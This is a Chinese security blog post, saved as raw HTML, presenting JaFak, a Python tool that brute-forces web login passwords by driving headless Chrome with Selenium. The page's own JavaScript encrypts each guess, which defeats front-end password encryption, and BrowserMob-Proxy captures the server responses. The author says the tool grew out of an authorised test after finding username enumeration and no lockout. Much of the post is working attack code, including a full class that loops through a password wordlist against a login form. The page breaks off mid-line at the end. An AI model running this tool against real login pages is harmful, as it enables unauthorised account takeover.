@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JaFak：一款无视js前端加密的账号密码爆破工具 | Mssn Harvey</title><meta name="keywords" content="工具推送,JaFak"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前因：其实这文讲得重点不是工具的开发，而是一种思想：  完全可以利用一些可自动化测试来帮助我们进行渗透测试任务  为什么会想到写这个脚本？爱恨情仇加纠缠 在我的潜意识里，我只会在真正用的时候才会去找轮子，造轮子，所以这次的脚本也是因为一次实际的常规测试引发的一连串连锁反应，我称之为铁索连环！ 在一次授权的系统测试中，我发现了系统找回密码功能处有个很有趣的事情，找回密码进行验证的时候，需要输入用户名">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JaFak：一款无视js前端加密的账号密码爆破工具">
+<meta property="og:url" content="http://example.com/2020/12/13/JaFak%EF%BC%9A%E4%B8%80%E6%AC%BE%E6%97%A0%E8%A7%86js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="Mssn Harvey">
+<meta property="og:description" content="前因：其实这文讲得重点不是工具的开发，而是一种思想：  完全可以利用一些可自动化测试来帮助我们进行渗透测试任务  为什么会想到写这个脚本？爱恨情仇加纠缠 在我的潜意识里，我只会在真正用的时候才会去找轮子，造轮子，所以这次的脚本也是因为一次实际的常规测试引发的一连串连锁反应，我称之为铁索连环！ 在一次授权的系统测试中，我发现了系统找回密码功能处有个很有趣的事情，找回密码进行验证的时候，需要输入用户名">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(22).jpg">
+<meta property="article:published_time" content="2020-12-13T06:31:20.000Z">
+<meta property="article:modified_time" content="2021-03-21T06:22:11.871Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="工具推送">
+<meta property="article:tag" content="JaFak">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(22).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/12/13/JaFak%EF%BC%9A%E4%B8%80%E6%AC%BE%E6%97%A0%E8%A7%86js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-21 14:22:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(22).jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">JaFak：一款无视js前端加密的账号密码爆破工具</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-13T06:31:20.000Z" title="发表于 2020-12-13 14:31:20">2020-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-21T06:22:11.871Z" title="更新于 2021-03-21 14:22:11">2021-03-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Gamma%E5%AE%9E%E9%AA%8C%E5%AE%A4/">Gamma实验室</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="前因："><a href="#前因：" class="headerlink" title="前因："></a>前因：</h3><p>其实这文讲得重点不是工具的开发，而是一种思想：</p>
+<blockquote>
+<p>完全可以利用一些可自动化测试来帮助我们进行渗透测试任务</p>
+</blockquote>
+<p>为什么会想到写这个脚本？爱恨情仇加纠缠</p>
+<p>在我的潜意识里，我只会在真正用的时候才会去找轮子，造轮子，所以这次的脚本也是因为一次实际的常规测试引发的一连串连锁反应，我称之为铁索连环！</p>
+<p>在一次授权的系统测试中，我发现了系统找回密码功能处有个很有趣的事情，找回密码进行验证的时候，需要输入用户名和相应绑定的邮箱，当我输入正确的用户名时候，系统会提示“用户名或邮箱错误”</p>
+<p>没毛病，模糊信息返回，但是当我输入正确的用户名和错误的邮箱时，系统会提示“输入邮箱错误”，相信各位大佬都知道了，这里挖掘到一枚用户名枚举的漏洞，通过系统的提示系统，批量爆破系统存在的用户名。</p>
+<p>但是，交过洞的大佬们都知道，除非是金融行业，或者其他很重要系统，一般是不会收这样的漏洞，收也是低位（超低的哟），恰巧我做的这个项目，不是那一类，所以没啥卵用。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/912996750.png"></p>
+<p>但是但是！这不像我们不曲不折的安全人员！毕竟国内的饭不太好要是吧（玩笑话）。</p>
+<h3 id="差点劝退"><a href="#差点劝退" class="headerlink" title="差点劝退"></a>差点劝退</h3><p>所以我决定搞点事情，把这个洞危害加大，我第一个想的就是爆破固定的用户名与密码，因为系统的登录页面，无论是你用户名错误还是密码错误，都返回“用户名和密码或错误！”，且没有验证码验证，也不限制次数，又因为我们枚举了正确的用户名，这个提示相当于变成了“密码错误，请重新输入”，就可以爆破固定用户名的密码了，burp启动，直接就冲了!</p>
+<p>看到密码后面有%3D%3D，我逐渐兴奋，这不就是base64加密吗？直接python脚本，先base64加密，然后爆破，舒服，等着出密码就行了！</p>
+<p>但是得先验证是否是base64加密，然后放入burp解码，我擦，解不出来，我刚开始还不相信，多试了几次，还真不是！</p>
+<p>没事没事，冷静冷静！这玩意密码学嘛，这不有手就能把他的加密逻辑给逆出来，哎呀，我擦，我的手勒？</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/752137079.png"></p>
+<p>然后打开js，进行源码分析，漂亮，一个混淆把我思路绕城了钢丝球！<br>直接给我整劝退，再见项目，再见网安，再见打工人，回家种田去了。</p>
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3594481489.png"></p>
+<h3 id="天马行空"><a href="#天马行空" class="headerlink" title="天马行空"></a>天马行空</h3><p>但是吧，我觉得难不倒我，我还可以抢救一下，因为我以前看过大佬，通过本地建立服务，去调用系统的js，然后为己用，但是也得找到加密函数的接口，bp上面就有插件，本地起服务，但是也得找到加密的入口函数！还是佩服那些前端调试硬刚的大佬，真是大佬！</p>
+<p>因为我以前见过国外的某性能测试软件，不知道啥名字了，反正挺贵的，能自动控制浏览器进行性能设置，就好比一个机器人帮你输入，帮你提交，帮你访问网站，我觉得酷死了，然后我就想了想咋实现的，想起自动化，我肯定第一时间想起了python，Google一搜还真有！</p>
+<p>有事找百度，google准没错！</p>
+<h3 id="开始奇幻之旅"><a href="#开始奇幻之旅" class="headerlink" title="开始奇幻之旅"></a>开始奇幻之旅</h3><p>为什么说奇幻勒?因为爬坑的故事真的一把鼻涕一把泪的，别说了，哭晕在厕所。</p>
+<p>开始使用selenium框架。。。。。。。。。。。。。</p>
+<p>Selenium 是什么？一句话，自动化测试工具。</p>
+<p>它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器，如果你在这些浏览器里面安装一个 Selenium 的插件，那么便可以方便地实现 Web 界面的测试。换句话说叫 Selenium 支持这些浏览器驱动。</p>
+<p>这里用的东西python+selenium+browsermobproxy</p>
+<h3 id="爱-之-初-步-体-验"><a href="#爱-之-初-步-体-验" class="headerlink" title="爱 之 初 步 体 验"></a>爱 之 初 步 体 验</h3><p>我们先来一个小例子感受一下 Selenium，这里我们用 Chrome 浏览器来测试（当然你可以i缓存其他的浏览器不影响）。<br>注意在尝试这段代码之前，你得安装chrome浏览器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">browser &#x3D; webdriver.Chrome()</span><br><span class="line">browser.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>运行这段代码，它会自动打开chrome浏览器，然后打开<a target="_blank" rel="noopener" href="http://www.baidu.com/%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5%EF%BC%8C%E5%AE%8C%E5%85%A8%E5%8F%AF%E8%A7%86%E5%8C%96%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BD%A0%E4%BC%9A%E7%9C%8B%E5%88%B0%E4%BD%A0%E7%9A%84chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E8%BF%99%E4%B8%AA%E8%BF%87%E7%A8%8B%E3%80%82">http://www.baidu.com/这个网页，完全可视化，因为你会看到你的chrome浏览器打开浏览这个过程。</a></p>
+<blockquote>
+<p>如果代码执行错误，浏览器没有打开，那么应该是没有装 Chrome 浏览器或者 Chrome 驱动没有配置在环境变量里。下载驱动，然后将驱动文件路径配置在环境变量即可</p>
+</blockquote>
+<p>但是因为我们的测试需要提交爆破的用户名和密码打开网页是远远不够的，所以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;http:&#x2F;&#x2F;www.python.org&quot;)</span><br><span class="line">assert &quot;Python&quot; in driver.title#等待加载结束</span><br><span class="line">elem &#x3D; driver.find_element_by_name(&quot;q&quot;)</span><br><span class="line">elem.send_keys(&quot;pycon&quot;)</span><br><span class="line">elem.send_keys(Keys.RETURN)</span><br><span class="line">print（driver.page_source）</span><br></pre></td></tr></table></figure>
+
+<p>这段代码会遍历打开<a target="_blank" rel="noopener" href="http://www.python.org这个网页/">http://www.python.org这个网页</a>，等Python字体加载出来的时候，才遍历html 树状结构，找到name为q的标签，然后填入pycon，然后模拟点击</p>
+<p>这里为什么要等待加载，因为可能网站有jq什么的加载没完全，再点击会失去原来的韵味。</p>
+<p>根据实际需求的情况需要这段代码被我改成了这个样子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;xxxxxxxx&quot;)</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)#找到输入用户名的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)##找到输入密码的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()#找到登录标签，然后点击</span><br></pre></td></tr></table></figure>
+
+<p>这样就模拟了一次完整的用户名和密码输入，以及点击登录的效果.</p>
+<blockquote>
+<p>坑点1<br>这里为什么要用css_selector，本来可以直接使用by_class_name的，但是因为我实际利用场景这里很特殊，class的名字之间有空格，使用by_class_name获取不到，如果class的名字没有空格，就可以直接获取，当然也可以通过标签的其他的属性访问到.</p>
+</blockquote>
+<p>但是这样只能提交一次登录请求，而且还得必须清空上一次填写的账号密码，再改进</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;xxxxxxxx&quot;)</span><br><span class="line">#循环加在这</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)#找到输入用户名的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)##找到输入密码的标签，把用户名输入进去</span><br><span class="line">driver.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()#找到登录标签，然后点击</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br></pre></td></tr></table></figure>
+
+<p>再此基础上加个循环，可以批量爆破他的密码了，因为chrome浏览器已经自动加载调用js帮我们加密好了变成了密文，然后再发送过去，真是nice鸭！</p>
+<p>但是有个问题,就是我无法捕获服务器的返回包,刚开始使用selenium抓取chromedriver的network</p>
+<blockquote>
+<p>抓到的流量还得自己分析,就很难受,然后就是使用了browsermobproxy 来开启一个中间的代理,让我的chrome先去经过browermobproxy,然后browermobproxy抓取我的http流量,就可以拿到了服务器返回包了.就很nice!</p>
+</blockquote>
+<p>Browsermob-Proxy是一个开源的Java编写的基于LittleProxy的代理服务。Browsermob-Proxy的具体流程有点类似与Flidder或Charles。即开启一个端口并作为一个标准代理存在，当HTTP客户端（浏览器等）设置了这个代理，则可以抓取所有的请求细节并获取返回内容。<br>安装:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">直接到项目的github上下载打好的压缩包即可:https:&#x2F;&#x2F;github.com&#x2F;lightbody&#x2F;browsermob-proxy&#x2F;releases，支持Linux和Windows。</span><br><span class="line"></span><br><span class="line">安装对应的python包:</span><br><span class="line"></span><br><span class="line">pip install browsermob-proxy</span><br><span class="line">下载好browsermob-proxy之后，放在指定一个目录，例如我这里是 D:\apk\browsermob-proxy-2.1.4-bin\browsermob-proxy-2.1.4这个路径下，所以下面示例代码如：</span><br><span class="line"></span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">server &#x3D; Server(&quot;路径&quot;)</span><br><span class="line">server.start()</span><br><span class="line">proxy &#x3D; server.create_proxy()</span><br></pre></td></tr></table></figure>
+
+<p>配置Proxy启动WebDriver:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line"></span><br><span class="line">chrome_options &#x3D; Options()</span><br><span class="line">chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(proxy.proxy))</span><br><span class="line">driver &#x3D; webdriver.Chrome(chrome_options&#x3D;chrome_options)</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是:</p>
+<blockquote>
+<p>browsermob-proxy起的Server默认是8080端口</p>
+</blockquote>
+<p>可以直接进入到Server这个类里面去修改他的监听端口<br>直接上根据实际测试需求最终代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">class Brower_scan():</span><br><span class="line">def __init__(self,url,username,password_dir):</span><br><span class="line">self.url &#x3D; url</span><br><span class="line">self.response_result &#x3D; []</span><br><span class="line">self.result&#x3D;&#123;&#125;</span><br><span class="line">self.init_browsermobproxy()</span><br><span class="line">self.init_chrome()</span><br><span class="line">self.init_dict_list(username,password_dir)</span><br><span class="line">self.result_handing()</span><br><span class="line">self.end_env()</span><br><span class="line">def init_dict_list(self,username,password_dir):</span><br><span class="line">with open(password_dir,&quot;r&quot;) as f:</span><br><span class="line">self.password_list &#x3D; f.readlines()</span><br><span class="line">for password in self.password_list:</span><br><span class="line">self.fill_out_a_form(username,password.replace(&#39;\n&#39;,&#39;&#39;))</span><br><span class="line">self.wget_response()</span><br><span class="line">def init_browsermobproxy(self):</span><br><span class="line">self.server &#x3D; Server(&quot;browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat&quot;)#browermobproxy文件的位置</span><br><span class="line">self.server.start()</span><br><span class="line">self.proxy &#x3D; self.server.create_proxy()</span><br><span class="line">self.chrome_options &#x3D; Options()</span><br><span class="line">self.chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(self.proxy.proxy))</span><br><span class="line">self.chrome_options.add_argument(&#39;--headless&#39;)#这里加了一个参数,不启动chrome浏览器,省去了启动的时间,更快了</span><br><span class="line">def init_chrome(self):</span><br><span class="line">try:</span><br><span class="line">self.chrome &#x3D; webdriver.Chrome(chrome_options&#x3D;self.chrome_options)</span><br><span class="line">self.proxy.new_har(&quot;ht_list2&quot;, options&#x3D;&#123;&#39;captureContent&#39;: True&#125;)</span><br><span class="line">self.chrome.get(self.url)</span><br><span class="line">except Exception as e:</span><br><span class="line">print(&quot;Chrome浏览器启动失败！\n&quot;)</span><br><span class="line">return 0</span><br><span class="line">def fill_out_a_form(self,username,password):</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-with-prefix&#39;]&quot;).send_keys(</span><br><span class="line">username)</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;ivu-input  ivu-input-with-suffix&#39;]&quot;).send_keys(password)</span><br><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;ivu-btn ivu-btn-primary  ivu-btn-large&#39;]&quot;)).click()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;iivu-input ivu-input-with-prefix&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input  ivu-input-with-suffix&#39;]&quot;).clear()</span><br><span class="line">def wget_response(self):</span><br><span class="line">result &#x3D; self.proxy.har</span><br><span class="line">for entry in result[&#39;log&#39;][&#39;entries&#39;]:</span><br><span class="line">_url &#x3D; entry[&#39;request&#39;][&#39;url&#39;]</span><br><span class="line">print(_url)</span><br><span class="line">if &quot;password&quot; in _url and &quot;username&quot; in _url:</span><br><span class="line">_response &#x3D; entry[&#39;response&#39;]</span><br><span class="line">_content &#x3D; _response[&#39;content&#39;]</span><br><span class="line"># 获取接口返回内容</span><br><span class="line">self.response_result.append(_response[&#39;content&#39;][&#39;text&#39;])</span><br><span class="line">self.result &#x3D; dict(zip(self.password_list, self.response_result))</span><br><span class="line">def result_handing(self):</span><br><span class="line">for key,value in self.result.items():</span><br><span class="line">print(&quot;密码：&#123;key&#125; :结果：&#123;result&#125;&quot;.format(key&#x3D;key,result&#x3D;value))</span><br><span class="line">def end_env(self):</span><br><span class="line">try:</span><br><span class="line">self.server.stop()</span><br><span class="line">self.chrome.quit()</span><br><span class="line">find_netstat &#x3D; os.popen(&quot;netstat -ano | findstr 